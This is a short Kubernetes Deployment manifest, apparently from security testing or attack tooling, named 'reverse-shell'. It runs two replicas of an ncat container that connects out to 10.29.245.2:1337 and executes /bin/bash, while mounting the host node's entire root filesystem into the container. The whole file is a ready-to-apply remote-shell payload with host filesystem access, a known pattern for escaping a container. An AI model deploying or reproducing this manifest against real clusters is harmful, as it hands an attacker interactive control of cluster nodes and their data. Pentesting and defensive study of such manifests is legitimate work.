apiVersion: apps/v1
kind: Deployment
metadata:
  name: reverse-shell
spec:
  selector:
    matchLabels:
      app: reverse-shell
  replicas: 2
  template:
    metadata:
      labels:
        app: reverse-shell
    spec:
      containers:
      - name: ncat-reverse-shell
        image: raesene/ncat:latest
        resources:
          limits:
            cpu: 1000m
            memory: 1024Mi
        volumeMounts:
        - mountPath: /host
          name: hostvolume
        args: ['10.29.245.2', '1337', '-e', '/bin/bash']
      volumes:
        - name: hostvolume
          hostPath:
            path: /
            type: Directory
      
